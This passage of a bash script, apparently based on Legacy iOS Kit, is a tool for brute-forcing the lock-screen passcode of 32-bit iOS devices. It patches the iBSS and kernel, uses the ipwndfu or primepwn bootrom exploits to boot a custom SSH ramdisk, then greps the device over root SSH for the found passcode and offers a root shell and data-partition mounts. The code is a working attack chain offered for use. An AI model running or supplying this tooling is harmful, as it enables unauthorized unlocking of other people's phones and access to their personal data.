            [[ $device_proc -le 1 ]] && cpu_arch="armv6"

            python3 $PROJECT_ROOT/resources/kernel_patch.py Kernelcache.raw --os $ios_major --arch $cpu_arch
            if [[ -s Kernelcache.patched ]]; then
                "$dir/xpwntool" Kernelcache.patched Kernelcache.dec -t Kernelcache.dec.bak
                log "Kernel patched successfully."
            else
                warn "Kernel patch failed."
                mv Kernelcache.dec.bak Kernelcache.dec
            fi
        else
            warn "kernel_patch.py not found."
            mv Kernelcache.dec.bak Kernelcache.dec
        fi
    fi
    
    mv iBSS iBEC DeviceTree.dec Kernelcache.dec Ramdisk.dmg $ramdisk_path 2>/dev/null
    log "Ramdisk files saved: saved/$device_type/ramdisk_$build_id"
}

# ==================== BOOTCHAIN FUNCTIONS ====================

patch_ibss_for_sending() {
    local build_id="${device_target_build:-12H321}"
    
    # A5 fallback for older versions
    case $build_id in
        [56789]* )
            case $device_type in
                iPad2,* | iPad3,[123] | iPod5,1 ) build_id="12H321";;  # A5
                iPad3,[456] | iPhone5,* ) build_id="12H321";;  # A6
                * ) build_id="10B329";;  # Fallback
            esac
            log "Using iBSS from build $build_id for A5/A6 workaround"
        ;;
    esac
    
    log "Creating pwnediBSS from build $build_id..."
    device_fw_key_check $build_id
    ipsw_get_url $build_id
    local name iv key hwmodel="$device_model"
    case $build_id in [789]* | 10* | 11* | 12* | 13* | 14* ) hwmodel+="ap";; esac
    name="iBSS.$hwmodel.RELEASE.dfu"
    
    mkdir -p $PROJECT_ROOT/saved/$device_type
    [[ -s $PROJECT_ROOT/saved/$device_type/pwnediBSS_$build_id ]] && {
        cp $PROJECT_ROOT/saved/$device_type/pwnediBSS_$build_id pwnediBSS
        log "Using cached pwnediBSS."
        return
    }
    
    [[ -s $PROJECT_ROOT/saved/$device_type/iBSS_$build_id.dfu ]] && cp $PROJECT_ROOT/saved/$device_type/iBSS_$build_id.dfu iBSS.orig || \
        "$dir/pzb" -g "Firmware/dfu/$name" -o iBSS.orig "$ipsw_url"
    [[ ! -s iBSS.orig ]] && error "Failed to get iBSS."
    cp iBSS.orig $PROJECT_ROOT/saved/$device_type/iBSS_$build_id.dfu 2>/dev/null
    iv=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "iBSS") | .iv')
    key=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "iBSS") | .key')
    "$dir/xpwntool" iBSS.orig iBSS.dec -iv $iv -k $key -decrypt
    "$dir/xpwntool" iBSS.dec iBSS.raw
    "$dir/iBoot32Patcher" iBSS.raw pwnediBSS --rsa
    
    if [[ ! -s pwnediBSS ]]; then
        error "Failed to create pwnediBSS."
    fi
    
    cp pwnediBSS $PROJECT_ROOT/saved/$device_type/pwnediBSS_$build_id
    log "pwnediBSS created."
}

ipwndfu_send_ibss() {
    local cur_mode="$($irecovery -q 2>/dev/null | grep -w "MODE" | cut -c 7- | xargs)"
    if [[ $cur_mode == "iBSS" || $cur_mode == "iBEC" ]]; then
        log "Device is already in $cur_mode mode. Skipping redundant pwnediBSS send."
        return
    fi

    [[ ! -s pwnediBSS ]] && [[ ! -s $PROJECT_ROOT/saved/$device_type/pwnediBSS ]] && patch_ibss_for_sending
    [[ -s $PROJECT_ROOT/saved/$device_type/pwnediBSS ]] && cp $PROJECT_ROOT/saved/$device_type/pwnediBSS .
    [[ ! -s pwnediBSS ]] && error "pwnediBSS not found."
    
    if [[ -x $primepwn ]]; then
        log "Sending pwnediBSS using primepwn..."
        $primepwn pwnediBSS
        local ret=$?
        if [[ $ret == 0 ]]; then
            log "pwnediBSS sent."
            sleep 2
            return
        fi
        warn "primepwn failed, falling back to ipwndfu..."
    fi

    log "Sending pwnediBSS using ipwndfu..."
    local python2="$(command -v python2)"
    local pyenv2="$HOME/.pyenv/versions/2.7.18/bin/python2"
    [[ -z $python2 && -e $pyenv2 ]] && python2="$pyenv2"
    [[ $platform == "macos" ]] && (( $(sw_vers -productVersion | cut -d. -f1) < 12 )) && python2="/usr/bin/python"
    
    if [[ -z $python2 ]]; then
        warn "python2 not found. Install with: pyenv install 2.7.18"
        error "Cannot send iBSS without python2/ipwndfu."
    fi
    
    # Setup ipwndfu
    mkdir -p $PROJECT_ROOT/resources/ipwndfu
    if [[ ! -s $PROJECT_ROOT/resources/ipwndfu/ipwndfu ]]; then
        log "Downloading ipwndfu..."
        download_from_url "https://github.com/LukeZGD/ipwndfu/archive/refs/heads/master.zip" ipwndfu.zip
        unzip -q ipwndfu.zip -d $PROJECT_ROOT/resources/
        rm -rf $PROJECT_ROOT/resources/ipwndfu
        mv $PROJECT_ROOT/resources/ipwndfu-* $PROJECT_ROOT/resources/ipwndfu
    fi
    
    # Setup libusb symlink for macOS
    if [[ $platform == "macos" ]]; then
        [[ -e /opt/local/lib/libusb-1.0.dylib ]] && ln -sf /opt/local/lib "$HOME/lib"
        [[ -e /opt/homebrew/lib/libusb-1.0.dylib ]] && ln -sf /opt/homebrew/lib "$HOME/lib"
        [[ -e /usr/local/lib/libusb-1.0.dylib ]] && ln -sf /usr/local/lib "$HOME/lib"
    fi
    
    # S5L8900 might fail with -l, just try
    cp pwnediBSS $PROJECT_ROOT/resources/ipwndfu/
    pushd $PROJECT_ROOT/resources/ipwndfu >/dev/null
    "$python2" ipwndfu -l pwnediBSS
    local ret=$?
    popd >/dev/null
    [[ $ret != 0 ]] && warn "Failed to send pwnediBSS (might be normal for S5L8900)."
    log "pwnediBSS sent."
    sleep 2
}

boot_sshrd() {
    local ramdisk_path="$PROJECT_ROOT/saved/$device_type/ramdisk_$device_target_build"

    device_enter_mode pwnDFU
    
    if [[ $device_proc == 5 || $device_proc == 6 ]]; then
        # pwnediBSS already sent by enter_pwndfu
        log "Sending iBEC..."
        $irecovery -f $ramdisk_path/iBEC
        $irecovery -c go
        sleep 3
    else
        log "Sending iBSS..."; $irecovery -f $ramdisk_path/iBSS; sleep 2
        log "Sending iBEC..."; $irecovery -f $ramdisk_path/iBEC; sleep 3
    fi
    
    device_find_mode Recovery
    log "Sending ramdisk..."; $irecovery -f $ramdisk_path/Ramdisk.dmg
    $irecovery -c "getenv ramdisk-delay"
    $irecovery -c ramdisk; sleep 2
    log "Sending DeviceTree..."; $irecovery -f $ramdisk_path/DeviceTree.dec; $irecovery -c devicetree
    log "Sending Kernelcache..."; $irecovery -f $ramdisk_path/Kernelcache.dec; $irecovery -c bootx
    log "Booting..."
    log "Bruteforce will auto-run on device screen."
    print "* Passcode will be shown on device when found."
}


# ==================== SSH FUNCTIONS ====================

device_iproxy() {
    killall iproxy 2>/dev/null
    log "Starting iproxy..."
    "$iproxy" $ssh_port 22 >/dev/null 2>&1 &
    iproxy_pid=$!
    sleep 1
}

device_ssh() {
    device_iproxy
    log "Connecting to SSH (root@127.0.0.1:$ssh_port)..."
    $ssh2 -p $ssh_port root@127.0.0.1
    kill $iproxy_pid 2>/dev/null
}

fetch_passcode() {
    device_iproxy
    log "Searching for passcode results..."
    local found passcode
    
    # Prioritize searching in root directory / (where results typically appear)
    found=$($ssh2 -p $ssh_port root@127.0.0.1 "grep -l \"passcode\" /* 2>/dev/null | head -n 1")
    
    # Fallback to general search in common locations
    if [[ -z $found ]]; then
        found=$($ssh2 -p $ssh_port root@127.0.0.1 "grep -l \"passcode\" /mnt2/*.plist /tmp/*.plist 2>/dev/null | head -n 1")
    fi

    # Deep search as a last resort
    if [[ -z $found ]]; then
        warn "Initial search found nothing. Starting deep search from /..."
        found=$($ssh2 -p $ssh_port root@127.0.0.1 "find / -type f -not -path \"/mnt1/*\" -exec grep -l \"passcode\" {} + 2>/dev/null | head -n 1")
    fi
    
    if [[ -n $found ]]; then
        print "Found passcode result in: $found"
        # Try to extract from XML plist structure
        passcode=$($ssh2 -p $ssh_port root@127.0.0.1 "grep -A1 \"passcode\" \"$found\" 2>/dev/null | grep -o \">.*<\" | sed 's/[><]//g' | head -n 1")
        
        # If extraction failed, just show the line containing the word
        [[ -z $passcode ]] && passcode=$($ssh2 -p $ssh_port root@127.0.0.1 "grep \"passcode\" \"$found\" | head -n 1")

        echo
        echo "======================================"
        echo -e "      ${color_G}FOUND PASSCODE: ${color_Y}${passcode:-Unknown}${color_N}"
        echo "======================================"
        echo
        
        print "File content ($found):"
        echo "--------------------------------------"
        $ssh2 -p $ssh_port root@127.0.0.1 "cat \"$found\""
        echo "--------------------------------------"
    else
        error "Could not find any passcode results on the device."
    fi
    kill $iproxy_pid 2>/dev/null
}

mount_partitions() {
    device_iproxy
    log "Mounting partitions..."
    $ssh2 -p $ssh_port root@127.0.0.1 "mount.sh root" 2>/dev/null
    $ssh2 -p $ssh_port root@127.0.0.1 "mount.sh" 2>/dev/null
    log "Partitions mounted. Access them at /mnt1 (System) and /mnt2 (Data)."
    kill $iproxy_pid 2>/dev/null
}


# ==================== MAIN ====================



main() {
    clear
    echo "======================================"
    echo "::"
    echo "::    Bruteforce Passcode 32bit IOS Device"
    echo "::"
    echo "::    BUILD_TAG: 2.0.0"
    echo "::"
    echo "::    BUILD_SYTLE: RELEASE"
    echo "::"
    echo "::    BASE: LEGACY-IOS-KIT BY LUKEZGD"
    echo "::"
    echo "======================================"
    echo
    [[ $EUID == 0 ]] && error "Do not run as root."
    # Resources check moved to init section for reliability
    set_tool_paths
    device_get_info
    
    # 1. Create and Boot SSHRD
    create_sshrd
    boot_sshrd
    # 2. Skip Utility Menu for iOS 6+
    local major_ver="${device_target_build:0:2}"
    if [[ "$major_ver" =~ ^[0-9]+$ ]] && [[ $major_ver -ge 10 ]]; then
        log "Ramdisk boot sequence complete for iOS 6+ ($device_target_build). Exiting."
        exit
    fi
    
    # 2. Ramdisk Menu (Utility Menu) - For iOS 5 and below
    while true; do
        echo
        echo "================ UTILITY MENU ================"
        echo "1. Fetch Found Passcode (via SSH)"
        echo "2. SSH Terminal (root@127.0.0.1)"
        echo "3. Mount Partitions"
        echo "4. Reboot Device"
        echo "q. Exit"
        echo "=============================================="
        read -p "$(input 'Select an option: ')" opt
        case $opt in
            1) fetch_passcode;;
            2) device_ssh;;
            3) mount_partitions;;
            4) $irecovery -c "reboot"; exit;;
            q) exit;;
            *) echo "Invalid option.";;
        esac
    done
}

# ==================== INIT ====================

color_R=$(tput setaf 1); color_G=$(tput setaf 2); color_Y=$(tput setaf 208); color_N=$(tput sgr0)

for arg in "$@"; do
    case $arg in
        "--debug" ) set -x;;
        "--help" ) display_help; exit;;
        "--sshrd" ) ;; # default
        "--entry-device" ) device_argmode="entry";;
    esac
done

[[ ! -d "$PROJECT_ROOT/resources" ]] && { echo "[Error] Resources folder not found in $PROJECT_ROOT"; exit 1; }
mkdir -p "$PROJECT_ROOT/tmp$$"; cd "$PROJECT_ROOT/tmp$$" || exit 1
main
tput sgr0
